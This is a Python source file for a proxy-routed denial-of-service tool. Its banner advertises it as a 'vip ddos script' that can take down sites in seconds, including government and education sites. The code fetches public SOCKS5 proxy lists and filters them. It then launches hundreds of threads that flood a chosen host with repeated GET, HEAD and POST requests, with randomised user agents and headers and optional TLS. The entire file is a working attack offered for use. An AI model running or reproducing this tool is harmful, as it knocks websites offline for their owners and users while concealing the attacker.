import threading
import random
import time 
import socket
import sys
import requests
import socks
import ssl 
from user_agent import generate_user_agent, generate_navigator

print('''\r\n
▄▄▄▄▄     ▄▄▄▄▄       ▄▄▄▄      ▄▄▄▄
██▀▀▀██   ██▀▀▀██    ██▀▀██   ▄█▀▀▀▀█
██    ██  ██    ██  ██    ██  ██▄
██    ██  ██    ██  ██    ██   ▀████▄
██    ██  ██    ██  ██    ██       ▀██
██▄▄▄██   ██▄▄▄██    ██▄▄██   █▄▄▄▄▄█▀
▀▀▀▀▀     ▀
______________________________________________________________________________________
|                  version three[3]                          | [+]method[+]           |
|                                                            | [+]HTTP-FLOOD[+]       |
|               [!]vip ddos script[!]                        | [+]HTTPS-FLOOD[+]      |
|                                                            | [+]GET[+]              |
|              Coded By پاک شد خیخی                     | [+]POST[+]             |
|____________________________________________________________|________________________|
|              my tel channel : پاک شد خیخی              |        !!!!!!          |
|                                                            |[!]This script can down |
|[!]IN THIS VERSION YOU CAN ATTACK "GOV" AND "EDU" WEBSITE[!]|normal site in 10s[!]   |
|____________________________________________________________|________________________|\r\n''')

useragents=[]
for dgd in range(1,20000):
    ccc = generate_user_agent()
    useragents.append(ccc)
			
acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",

        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",

        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
		"Accept-Encoding: gzip, deflate\r\n", 
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",

        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",

        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
		"Accept-Encoding: gzip, deflate\r\n", 
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
        
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"

def clone():
    f = open("socks5.txt", 'wb')
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&timeout=1500")
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
        f.write(r.content)
        f.close()
    except:
        f.close()
    print("Socks Downloaded Sucessful !")

def prevent():
    if '192.168' in ip or '127.0' in ip or '172.16' in ip or 'localhost' in ip :
        print("Error Ip range!")
        exit()
def main():
    global ip
    global port
    global page
    global th_num
    global proxies
    global multiple
    global mode
    mode = str(input("what`s ddos mode =  get/head/post/http-flood/HTTPS-FLOOD:"))
    if mode == "":
        mode = "get"
    else:
        mode = str(mode)
    if mode == "get" or mode == "GET":
        print("GET Mode Selected")
    elif mode == "head" or mode == "HEAD":
        print("HEAD Mode Selected")
    elif mode == "post" or mode == "POST":
        print("POST Mode Selected")
    elif mode == "http-flood" or mode == "HTTPS-FLOOD":
        print("HTTP-FLOOD Mode Selected")
    ip = str(input("address:"))
    prevent()
    if ip == "":
        print("Try Again!!!")
        exit()
    page = str(input("Page (default=/):"))
    if page == "":
        page = "/"
    port = str(input("Port (HTTPS=443):"))
    if port =="":
        port = 80
        print("Port 80 Has Been Selected")
    else:
        port = int(port)
    if port == 443:
        print("Port 443 Has Been Selected")        
    th_num = str(input("Threads(default=300):"))
    if th_num == "":
        th_num = int(300)
    else:
        th_num = int(th_num)
    #if mode == "get" or mode == "GET":
    N = str(input("Download socks5 list ?(y/n):"))
    if N == "n" or N =="N":
        pass
    else:
        clone()
    out_file = str(input("Enter Proxy File Path(socks5.txt):"))
    if out_file == "":
        out_file = "socks5.txt"
    else:
        out_file = str(out_file)
    print ("Number Of Socks5 Proxies: %s" %(len(open(out_file).readlines())))
    proxies = open(out_file).readlines()
    time.sleep(0.3)
    ans = str(input("Check the socks list?(y/n, defualt=y):"))
    if ans == "n" or ans =="N":
        pass
    else:
        ms = str(input("Delay of socks(seconds, default=1):"))
        if ms == "":
            ms = int(1)
        else :
            ms = int(ms)
    check_socks()
    proxies = open(out_file).readlines()
    multiple = str(input("Input the Multiple(default=100):"))
    if multiple == "":
        multiple = int(100)
    else:
        multiple = int(multiple)

def get():
    rand_url = random.choice(strings)
    get_host = "GET " + page +"?"+ rand_url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n\r\n"
    accept = random.choice(acceptall)
    ua = random.choice(useragents)
    request = get_host + ua + accept + connection
    proxy = random.choice(proxies).strip().split(":")
    while 1:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
            s = socks.socksocket()
            if port == 443:
                ctx = ssl.SSLContext()#credits to leeon123
                s = ctx.wrap_socket(s,server_hostname=str(ip))
            s.connect((str(ip), int(port)))
            for _ in range(multiple):
                s.send(str.encode(request))
            s.close()
        except:
            pass

def head():
    rand_url = random.choice(strings)
    head_host = "HEAD " + page + rand_url +  " HTTP/1.1\r\nHost: " + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n\r\n"
    accept = random.choice(acceptall)
    ua = random.choice(useragents)
    request = head_host + ua + accept + connection
    proxy = random.choice(proxies).strip().split(":")
    while 1:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
            s = socks.socksocket()
            if port == 443:
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s,server_hostname=str(ip))
            s.connect((str(ip), int(port)))
            for _ in range(multiple):
                s.send(str.encode(request))
            s.close()
        except:
            pass
        
def post():
    rand_url = random.choice(strings)
    head_host = "POST " + page + rand_url +  " HTTP/1.1\r\nHost: " + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n\r\n"
    accept = random.choice(acceptall)
    ua = random.choice(useragents)
    request = head_host + ua + accept + connection
    proxy = random.choice(proxies).strip().split(":")
    while 1:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
            s = socks.socksocket()
            if port == 443:
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s,server_hostname=str(ip))
            s.connect((str(ip), int(port)))
            for _ in range(multiple):
                s.send(str.encode(request))
            s.close()
        except:
            pass
        
def http_flood():
    rand_url = random.choice(strings)
    head_host = "HTTP-FLOOD " + page + rand_url +  " HTTP/1.1\r\nHost: " + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n\r\n"
    accept = random.choice(acceptall)
    ua = random.choice(useragents)
    request = head_host + ua + accept + connection
    proxy = random.choice(proxies).strip().split(":")
    while 1:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
            s = socks.socksocket()
            if port == 443:
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s,server_hostname=str(ip))
            s.connect((str(ip), int(port)))
            for _ in range(multiple):
                s.send(str.encode(request))
            s.close()
        except:
            pass

nums = 0
def checking(lines,):
	global nums
	try:
		proxy = lines.strip().split(":")
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)#credits to leeon123
	except:
		proxies.remove(lines)
		return
	err = 0
	while True:
		if err == 3:
			proxies.remove(lines)
			break
		try:
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.settimeout(1)
			s.connect((str(ip), int(port)))
			if port==443:
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=ip)
			#s.connect((str(ip), int(port)))
			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks():
	global nums
	thread_list=[]
	for lines in list(proxies):
		th = threading.Thread(target=checking,args=(lines,))#credits to leeon123
		th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\nChecked all proxies, Total Worked:"+str(len(proxies)))
	with open("socks5.txt", 'wb') as fp:
		for lines in list(proxies):
			fp.write(bytes(lines,encoding='utf8'))
	fp.close()

n=0
if __name__ == "__main__":
    main()
if mode == "get" or mode == "GET":
    for i in range(th_num):
            th = threading.Thread(target=get,daemon=True)
            th.start()
elif mode == "head" or mode == "HEAD":
    for i in range(th_num):
            th = threading.Thread(target=head,daemon=True)
            th.start()
elif mode == "post" or mode == "POST":
    for i in range(th_num):
            th = threading.Thread(target=post,daemon=True)
            th.start()
elif mode == "http-flood" or mode == "HTTP-FLOOD":
    for i in range(th_num):
            th = threading.Thread(target=http_flood,daemon=True)
            th.start()

while True:
        key = ["-","\\","|","/","-"]
        try:
            if n>=4:
                n = 0
            time.sleep(0.1)
            sys.stdout.write("["+str(key[n])+"]Flooding "+ip+page+":"+str(port)+"\r")
            sys.stdout.flush()
            n +=1
        except KeyboardInterrupt:
            sys.stdout.write("\n")
            sys.stdout.flush()
            break

#پاب شود توسط چنل ترموکس
        



            
         